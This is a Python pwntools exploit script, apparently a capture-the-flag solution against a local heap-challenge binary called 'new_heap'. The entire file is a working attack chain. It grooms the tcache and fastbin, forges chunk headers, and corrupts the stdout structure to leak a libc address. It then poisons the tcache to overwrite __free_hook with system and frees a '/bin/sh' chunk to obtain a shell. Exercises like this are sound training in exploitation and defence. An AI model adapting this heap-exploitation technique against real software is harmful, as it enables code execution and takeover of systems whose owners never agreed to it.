from pwn import *

def add(size, pay):
	p.sendafter('exit', '1')
	p.sendafter(':', str(size))
	p.sendafter(':', pay)

def free(idx):
	p.sendafter('exit', '2')
	p.sendafter(':', str(idx))

def quit(pay):
	p.sendafter('exit', '3')
	p.sendafter('?', pay)

p = process('./new_heap')
e = ELF('./new_heap')
l = e.libc

#context.log_level = 'debug'

p.recvuntil('0x')
lsb = int(p.recvline().strip(), 16) << 8
print hex(lsb)

for i in range(8):
	add(0x50, 'a'*0x50)
# fill tcache:0x60
for i in range(7):
	free(i)

free(7) # fastbin:0x60
quit('\n') # 7 consolidated, stdin buffer allocated on 7's address

add(0x60, '2'*0x60) # 8 prevent stdin buffer consolidate into top
free(7) # free stdin buffer

add(0x60, '8'*0x60) # 9
add(0x40, 'j'*0x40) # 10
free(9)

fake = '\x00'*8+'a'*8 # e->key
fake += 'b'*0x50
fake += p64(0)+p64(0x51)
fake += 'j'*0x40
fake += p64(0)+p64(0xf51)
fake += '\x60\x17' # modify unsorted bin's fd to _IO_2_1_stdout_
quit(fake)

free(9) # dfb

add(0x60, '\xc0') # 11, unsorted bin's lsb
add(0x60, 'a') # 12
add(0x60, 'a') # 13
add(0x60, p64(0xfbad1800)+'\x00'*25) # 14, modify stdout struct

libc = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')- 0x1e7570
print hex(libc)

# set _IO_2_1_stdin->_IO_read_ptr == _IO_read_end
for i in range(len(fake)-1):
	p.sendafter('exit', '3')

# control pc
free(10)
quit('a'*0x60+p64(0)+p64(0x51)+p64(libc+l.sym['__free_hook'])) # tcache poisoning
add(0x40, '/bin/sh\x00') # 15
add(0x40, p64(libc+l.sym['system'])) # 16, alloc on __free_hook

free(15) # get shell

p.interactive()
